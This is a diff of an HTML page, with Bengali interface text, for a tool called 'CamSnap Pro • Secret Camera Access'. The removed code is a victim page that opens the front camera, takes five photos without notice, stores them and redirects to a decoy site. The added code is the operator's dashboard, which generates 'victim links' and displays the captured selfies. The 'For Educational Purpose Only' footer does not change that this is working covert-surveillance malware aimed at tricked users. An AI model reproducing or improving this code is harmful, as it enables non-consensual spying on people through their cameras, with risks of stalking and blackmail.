@@ -1,62 +1,141 @@
 <!DOCTYPE html>
-<html>
+<html lang="bn">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Connecting...</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>CamSnap • Secret Camera Access</title>
   <style>
-    body,html{margin:0;padding:0;height:100%;background:#111;color:#fff;font-family:sans-serif;overflow:hidden;}
-    .box{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;width:90%;}
-    video{width:100%;max-width:380px;border-radius:16px;border:4px solid #0066ff;box-shadow:0 0 40px rgba(0,102,255,0.6);}
-    .msg{color:#00ff9d;font-size:18px;margin:20px 0;animation:pulse 1.5s infinite;}
-    @keyframes pulse{0%,100%{opacity:0.7}50%{opacity:1}}
+    :root { --bg: #f8f9fa; --card: #ffffff; --text: #1a1a1a; --accent: #0066ff; --border: #e0e0e0; }
+    * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',sans-serif; }
+    body { background:var(--bg); color:var(--text); min-height:100vh; display:flex; flex-direction:column; }
+
+    /* হেডার */
+    header {
+      background:#fff; padding:20px 0; text-align:center; border-bottom:2px solid var(--border);
+      box-shadow:0 2px 10px rgba(0,0,0,0.05);
+    }
+    header img { height:60px; border-radius:8px; }
+
+    /* মেইন কন্টেন্ট */
+    main { flex:1; padding:30px 15px; max-width:520px; margin:0 auto; width:100%; }
+    .card { background:var(--card); border-radius:16px; padding:30px; box-shadow:0 8px 30px rgba(0,0,0,0.08); border:1px solid var(--border); }
+    h1 { font-size:2.2em; margin-bottom:12px; text-align:center; color:#222; }
+    p.desc { text-align:center; color:#555; font-size:1.1em; margin-bottom:25px; line-height:1.6; }
+
+    button {
+      background:var(--accent); color:white; border:none; padding:16px 24px; font-size:1.15em;
+      border-radius:12px; cursor:pointer; width:100%; font-weight:600; margin:15px 0;
+      transition:0.3s; box-shadow:0 4px 15px rgba(0,102,255,0.3);
+    }
+    button:hover { transform:translateY(-2px); box-shadow:0 8px 25px rgba(0,102,255,0.4); }
+
+    /* লিংক বক্স */
+    #linkBox { margin:25px 0; padding:20px; background:#f9f9ff; border-radius:12px; border:2px dashed #0066ff; display:none; }
+    input[type="text"] { width:100%; padding:14px; margin:10px 0; border:1px solid #ddd; border-radius:10px; font-size:1em; }
+    .small-btn { background:#333; padding:10px 20px; font-size:0.95em; margin:5px; display:inline-block; width:auto; }
+
+    /* ছবি গ্রিড */
+    .photos { display:grid; grid-template-columns:repeat(auto-fit,minmax(130px,1fr)); gap:15px; margin-top:30px; }
+    .photos img { width:100%; height:180px; object-fit:cover; border-radius:12px; border:3px solid #0066ff; cursor:pointer;
+                  box-shadow:0 4px 15px rgba(0,0,0,0.1); transition:0.3s; }
+    .photos img:hover { transform:scale(1.05); box-shadow:0 10px 30px rgba(0,102,255,0.3); }
+    .loading { text-align:center; padding:40px; color:#666; font-size:1.1em; }
+
+    footer { text-align:center; padding:20px; background:#fff; color:#777; font-size:0.9em; border-top:1px solid #eee; }
   </style>
 </head>
 <body>
 
-<div class="box">
-  <video id="cam" autoplay playsinline muted></video>
-  <canvas id="canvas" style="display:none;"></canvas>
-  <div class="msg">কানেক্টিং... ক্যামেরা চেক হচ্ছে</div>
-</div>
+<header>
+  <img src="https://i.imgur.com/your-logo-here.png" alt="CamSnap Logo"> <!-- এখানে তোমার লগো দিবি -->
+</header>
+
+<main>
+  <div class="card">
+    <h1>CamSnap Pro</h1>
+    <p class="desc">
+      একটি লিংক তৈরি করো — কেউ খুললেই তার ফ্রন্ট ক্যামেরা থেকে ৫টা সেলফি অটো চলে আসবে!
+    </p>
+
+    <button onclick="generateLink()">নতুন ক্যাম লিংক তৈরি করুন</button>
+
+    <div id="linkBox">
+      <p style="text-align:center; color:#0066ff; font-weight:600; margin-bottom:15px;">তোমার সিক্রেট লিংক রেডি!</p>
+      
+      <input type="text" id="redirectUrl" placeholder="রিডাইরেক্ট লিংক (যেখানে পাঠাবে)" value="https://www.instagram.com">
+
+      <input type="text" id="victimLink" readonly style="background:#f0f0f0; font-weight:500;">
+
+      <div style="text-align:center; margin-top:15px;">
+        <button class="small-btn" onclick="copyLink()">কপি করুন</button>
+        <button class="small-btn" onclick="updateLink()" style="background:#0066ff;">আপডেট</button>
+      </div>
+
+      <div style="text-align:center; margin-top:15px;">
+        <a href="" id="testLink" target="_blank" style="color:#0066ff; text-decoration:underline;">মোবাইলে টেস্ট করো</a>
+      </div>
+    </div>
+
+    <!-- ভিকটিমের ছবি এখানে দেখাবে -->
+    <div id="photos" class="photos">
+      <div class="loading">নতুন লিংক বানালে এখানে ভিকটিমের সেলফি আসবে...</div>
+    </div>
+  </div>
+</main>
+
+<footer>
+  Developed By <strong style="color:#000;">H4X0R</strong> • For Educational Purpose Only
+</footer>
 
 <script>
-const params = new URLSearchParams(location.search);
-const id = params.get('id');
-const redirect = decodeURIComponent(params.get('r') || 'https://google.com');
+let currentId = null;
 
-const video = document.getElementById('cam');
-const canvas = document.getElementById('canvas');
-const ctx = canvas.getContext('2d');
-let count = 0;
-const total = 5;
-const images = [];
+function generateLink() {
+  currentId = Date.now().toString(36) + Math.random().toString(36).substr(2, 6);
+  const redirect = encodeURIComponent(document.getElementById("redirectUrl").value || "https://google.com");
+  const victimUrl = location.href.split('index.html')[0] + 'view.html?id=' + currentId + '&r=' + redirect;
 
-navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-  .then(stream => {
-    video.srcObject = stream;
-    video.onloadedmetadata = () => {
-      video.play();
-      setTimeout(capturePhotos, 1800);
-    };
-  })
-  .catch(() => {
-    document.body.innerHTML = "<h2 style='color:#f00;padding:50px;text-align:center;'>ক্যামেরা বন্ধ আছে!</h2>";
-    setTimeout(() => location.href = redirect, 3000);
-  });
+  document.getElementById("linkBox").style.display = "block";
+  document.getElementById("victimLink").value = victimUrl;
+  document.getElementById("testLink").href = victimUrl;
 
-function capturePhotos() {
-  if (count >= total) {
-    localStorage.setItem('camsnap_' + id, JSON.stringify(images));
-    setTimeout(() => location.href = redirect, 1200);
-    return;
-  }
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  ctx.drawImage(video, 0, 0);
-  images.push(canvas.toDataURL('image/jpeg', 0.85));
-  count++;
-  setTimeout(capturePhotos, 700);
+  document.getElementById("photos").innerHTML = `<div class="loading">অপেক্ষা করো... ভিকটিম ক্যামেরা অন করলেই ছবি আসবে</div>`;
+  startLiveCheck();
+}
+
+function updateLink() {
+  const redirect = encodeURIComponent(document.getElementById("redirectUrl").value);
+  const victimUrl = location.href.split('index.html')[0] + 'view.html?id=' + currentId + '&r=' + redirect;
+  document.getElementById("victimLink").value = victimUrl;
+  document.getElementById("testLink").href = victimUrl;
+  alert("লিংক আপডেট হয়েছে!");
+}
+
+function copyLink() {
+  const link = document.getElementById("victimLink");
+  link.select(); link.setSelectionRange(0, 99999);
+  navigator.clipboard.writeText(link.value);
+  alert("লিংক কপি হয়ে গেছে!");
+}
+
+function startLiveCheck() {
+  if (!currentId) return;
+  const check = () => {
+    const data = localStorage.getItem('camsnap_' + currentId);
+    if (data) {
+      const imgs = JSON.parse(data);
+      document.getElementById("photos").innerHTML = '';
+      imgs.forEach(src => {
+        const img = document.createElement('img');
+        img.src = src;
+        img.onclick = () => window.open(src, '_blank');
+        document.getElementById("photos").appendChild(img);
+      });
+      localStorage.removeItem('camsnap_' + currentId);
+    }
+    setTimeout(check, 2500);
+  };
+  check();
 }
 </script>
 </body>
